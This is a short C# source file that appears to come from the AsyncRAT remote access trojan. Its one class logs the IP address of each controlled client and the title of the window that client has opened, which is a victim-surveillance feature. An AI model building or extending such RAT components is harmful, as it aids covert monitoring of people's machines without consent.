using AsyncRAT_Sharp.Sockets;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace AsyncRAT_Sharp.Handle_Packet
{
    public class HandleReportWindow
    {
        public HandleReportWindow(Clients client, string title)
        {
            new HandleLogs().Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} Opened [{title}]", Color.Blue);
        }
    }
}
